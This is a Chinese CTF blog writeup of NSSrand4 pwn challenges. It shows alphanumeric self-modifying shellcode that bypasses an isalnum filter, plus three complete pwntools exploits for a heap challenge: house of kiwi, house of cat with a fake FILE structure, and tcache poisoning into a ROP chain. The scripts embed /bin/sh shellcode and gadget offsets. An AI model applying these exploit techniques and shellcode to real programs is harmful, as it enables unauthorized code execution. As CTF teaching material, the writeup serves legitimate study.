---
title: 2022 NSSrand4 pwn Writeup
date: 2022-08-03 23:54:59 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=40/
pin: false
published:
---

## 百密一疏(限制字符可见shellcode)

关于可见字符shellcode：https://nets.ec/Ascii_shellcode

![image-20220803235535207](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220803235535207.png)

![image-20220803235510249](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220803235510249.png)

isalnum函数堆输入进行检测，实际上是一个可见shellcode的编写，ban掉了一部分字符，导致直接生成的话不可用。

方法是利用可用的可见字符shellcode对写入的目标位置进行修改，让目标位置变成syscall

思路是考虑用可见字符shellcode构建一个read，然后执行普通shellcode。在call rdx处打断点发现，此时的寄存器满足read条件，只需要执行syscall即可。syscall的字节码是`\x0f\x05`，不满足要求。考虑用xor对字节码进行修改变成`\x0f\x05`，xor a1, a2返回值存在a1中，利用这一点我们构造的shellcode如下

![image-20220804000254319](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220804000254319.png)

```
# 构造目标
# xor eax,eax ; syacall == "\x31\xc0\x0f\x05"
# 31 
# F3 33 (1 \xc0 # 这里f3利用rbx寄存器里存的地址里的值
# 38 37 (2 \x0f
# 33 36 (3 \x05
# 在0x30303071处存放目标shellcode 0x363833373331(\x31\x33\x37\x33\x38\x36)
# 先给eax赋值起始地址，便于后续取值
# 1
xor eax, 0x30303030
xor r14b,[rbx]
xor al, 0x42
xor [rax], r14b

# 2
xor al, 0x32
xor al, 0x35
xor r15b, [rax]
xor al, 0x35
xor al, 0x33
xor [rax], r15b

# clear r15
xor al, 0x33
xor al, 0x35
xor r15b, [rax]

# 3
xor al, 0x35
xor al, 0x36
xor r15b, [rax]
xor al, 0x36
xor al, 0x34
xor [rax], r15b

xor    al, 0x30 # padding to aim_addr
```

在https://shell-storm.org/online/Online-Assembler-and-Disassembler/中进行汇编即可

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'
p = process("./pwn")
# p = remote("1.14.71.254","28203")

elf = ELF("./pwn")
libc = elf.libc

def dbg(con=""):
    gdb.attach(p,con)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
read = "\x31\xc0\x0f\x05"

dbg("b *$rebase(0x13d9)")
pay = "\x35\x30\x30\x30\x30\x44\x32\x33\x34\x42\x44\x30\x30\x34\x32\x34\x35\x44\x32\x38\x34\x35\x34\x33\x44\x30\x38\x34\x33\x34\x35\x44\x32\x38\x34\x35\x34\x36\x44\x32\x38\x34\x36\x34\x34\x44\x30\x38"
pay += "\x34\x30"*31+"\x44\x32\x38"# padding
pay += "\x31\x33\x37\x33\x38\x36" # +0x71

sl(pay)
pay = "\x90"*0x80
pay += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sl(pay)
p.interactive()
```

## 做道堆题休息一下吧(高版本的小sizeoffbynull)

![image-20220804094712483](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220804094712483.png)

堆菜单题，漏洞点在于除add功能外其它三个功能输入idx为int类型，能负数溢出控制到bss段上指向自己的一个地址，就能editbss段上的信息

还有一个漏洞点是offbynull，这题的add固定malloc(0xF0uLL)

![image-20220804094819030](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220804094819030.png)

![image-20220804094938687](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220804094938687.png)

### 第一种方法

利用负数越界写，任意地址修改，house of kiwi

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'
p = process("./pwn")
p = remote("1.14.71.254","28203")

elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add():
	sla("CHOICE: ",1)

def edit(idx,size,con='a'):
	sla("CHOICE: ",2)
	sla("INDEX: ",idx)
	sla("SIZE: ",size)
	p.sendafter("CONTENT: ",con)

def show(idx):
	sla("CHOICE: ",3)
	sla("INDEX: ",idx)	

def dele(idx):
	sla("CHOICE: ",4)
	sla("INDEX: ",idx)	


edit(-8,0xf8,p64(0xfbad1887)+p64(0)+p64(0)+p64(0)+p8(0x58))
libc_base = uu64()-0x1f4560
lg('libc_base')

add()
add()
dele(1)
dele(0)
add()
add()
show(1)
heap_base = u64(p.recv(5).ljust(8,'\x00'))<<12
lg('heap_base')

show(-11)
base = u64(p.recv(6).ljust(8,'\x00'))
lg('base')


setcontext = libc_base + libc.sym['setcontext'] + 61
Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']

IO_file_jumps = libc_base + 0x1f4560
IO_helper_jumps = libc_base + 0x1f3960
IO_wfile_jumps = libc_base + 0x1f4020
pop_rdi = 0x000000000002daa2 + libc_base
pop_rsi = 0x0000000000037bda + libc_base
pop_rdx_rbx = 0x0000000000087759 + libc_base
pop_rax = 0x000000000002fff4+libc_base
syscall = 0x00000000000883e6+libc_base
ret= 0x000000000002c909+libc_base
flag = heap_base+0x2a0

rop =  p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x500)+p64(pop_rdx_rbx)+p64(0x30)*2+p64(Read)
rop += p64(pop_rdi)+p64(1)+p64(Write)

edit(0,0xf0,'flag'.ljust(0x10,'\x00'))
edit(1,0xf0,rop)

pay = p64(base)+'\x00'*0x10+p64(libc_base+0x1f3760)+p64(0)+p64(libc_base+0x1f2a80)+p64(0)+p64(libc_base+0x1f3680)
pay += p64(0)*3+p64(heap_base+0x2a0)+p64(IO_file_jumps+0x60)+p64(IO_helper_jumps+0xa0)+p64(heap_base+0x490)
edit(-11,0xf8,pay)
edit(1,0xf0,p64(setcontext))
edit(2,0xf0,p64(heap_base+0x3a0)+p64(ret))
edit(3,0xf0,p64(0)*2)

add()
p.interactive()
```

### 第二种方法

利用负数越界可以修改stderr变量，house of cat，再改掉topchunksize触发。

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'
p = process("./pwn")

elf = ELF("./pwn")
libc = elf.libc

def dbg(con=''):
    gdb.attach(p,con)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add():
	sla("CHOICE: ",1)

def edit(idx,size,con):
	sla("CHOICE: ",2)
	sla("INDEX: ",idx)
	sla("SIZE: ",size)
	p.sendafter("CONTENT: ",con)

def show(idx):
	sla("CHOICE: ",3)
	sla("INDEX: ",idx)	

def dele(idx):
	sla("CHOICE: ",4)
	sla("INDEX: ",idx)	


edit(-8,0xf8,p64(0xfbad1887)+p64(0)+p64(0)+p64(0)+p8(0x58))
# p.recvuntil("\n")
libc_base = uu64()-0x1f4560
lg('libc_base')

add()
add()
dele(1)
dele(0)
add()
add()
show(1)
heap_base = u64(p.recv(5).ljust(8,'\x00'))<<12
lg('heap_base')

show(-11)
base = u64(p.recv(6).ljust(8,'\x00'))
lg('base')

setcontext = libc_base + libc.sym['setcontext'] + 61
Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']

IO_wfile_jumps = libc_base + 0x1f4020
pop_rdi = 0x000000000002daa2 + libc_base
pop_rsi = 0x0000000000037bda + libc_base
pop_rdx_rbx = 0x0000000000087759 + libc_base
pop_rax = 0x000000000002fff4+libc_base
syscall = 0x00000000000883e6+libc_base
ret= 0x000000000002c909+libc_base


flag = heap_base+0x3a8
fake_io_addr = heap_base+0x290
next_chain = 0
fake_IO_FILE =  p64(0)*2+p64(0)+p64(0)+p64(0)*2
fake_IO_FILE += p64(1)+p64(0)
fake_IO_FILE += p64(fake_io_addr+0xb0) #_IO_backup_base=setcontext_rdx
fake_IO_FILE += p64(setcontext) #_IO_save_end=call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xB0, '\x00')
fake_IO_FILE += p64(1) # _mode = 0
fake_IO_FILE =  fake_IO_FILE.ljust(0xC8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

payload = fake_IO_FILE.ljust(0x100,'\x00')
payload +='flag'.ljust(0x10, '\x00')+p64(0)*5+p64(heap_base+0x4a0)+p64(ret)# + 0xa0/0xa8


rop =  p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(fake_io_addr+0x500)+p64(pop_rdx_rbx)+p64(0x30)*2+p64(Read)
rop += p64(pop_rdi)+p64(1)+p64(Write)

edit(0,0xf0,payload[:0xf0])
edit(1,0xf0,payload[0x100:])
add()
edit(2,0xf0,rop)

pay = p64(base)+'\x00'*0x10+p64(libc_base+0x1f3760)+p64(0)+p64(libc_base+0x1f2a80)+p64(0)+p64(heap_base+0x290)
pay += p64(0)*3+p64(heap_base+0x2a0)+p64(heap_base+0x3a0)+p64(heap_base+0x4a0)+p64(heap_base+0x590)
edit(-11,0xf8,pay)
edit(3,0xf8,p64(0)+p64(0))

dbg("dir ~/glibc/glibc-2.34/")
add()

p.interactive()
```

### 第三种方法

利用offbynull，做一个堆复用，然后改tcachefd任意地址申请，劫持栈ret

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'
p = process("./pwn")
# p = remote("1.14.71.254","28203")

elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add():
	sla("CHOICE: ",1)

def edit(idx,size,con='a'):
	sla("CHOICE: ",2)
	sla("INDEX: ",idx)
	sla("SIZE: ",size)
	p.sendafter("CONTENT: ",con)

def show(idx):
	sla("CHOICE: ",3)
	sla("INDEX: ",idx)	

def dele(idx):
	sla("CHOICE: ",4)
	sla("INDEX: ",idx)	

#-------------------粘prev_size----------------------
for i in range(10):
    add()

for i in range(3,10):
    dele(i)
 
dele(0)
dele(1)
dele(2)

for i in range(10):
    add()

show(9)
 
key = u64(p.recv(5).ljust(8,"\x00"))
heap_base = key << 12
lg('heap_base')
 
show(8)
libc_base =uu64()-0x1f2cc0
lg('libc_base')
environ = libc_base + libc.sym["environ"]
pop_rdi = libc_base + 0x000000000002daa2
pop_rsi = libc_base + 0x0000000000037bda
pop_rdx_rbx = libc_base + 0x0000000000087759
bin_sh = libc_base  + 0x00000000001b4689 
Open = libc_base + libc.sym["open"]
read = libc_base + libc.sym["read"]
puts = libc_base + libc.sym["puts"]
flag_addr = libc_base + libc.bss()
ret = libc_base + 0x000000000002c909 

rop = p64(pop_rdi) + p64(heap_base+0x2a0) + p64(pop_rsi) + p64(0) + p64(Open)
rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr+0x10) + p64(pop_rdx_rbx) + p64(0x100) + p64(0)+ p64(read)
rop += p64(pop_rdi) + p64(flag_addr+0x10) + p64(puts)

for i in range(7):
    dele(i)
#------------------------------------------------
edit(7,0xf8,p64(heap_base+0x290)*2)# unlink
dele(8)

for i in range(7):
    add()
 
add()# 8-7
dele(9)
dele(8)
 
edit(7,0x10,p64(environ ^ key))
add() #8
add() #9
show(9)
 
stack_addr = u64(p.recv(6).ljust(8,"\x00")) - 0x150 - 0x48
lg("stack_addr")

add() #10
dele(10)
dele(8)

edit(7,0x10,p64(stack_addr ^ key))
add() #8
add() #10
 
edit(8,0x8,"flag\x00")
 
pay = p64(ret)*9 + rop
 
# print(len(pay))
# dbg()
edit(10,0xe0,pay)

p.interactive()
```



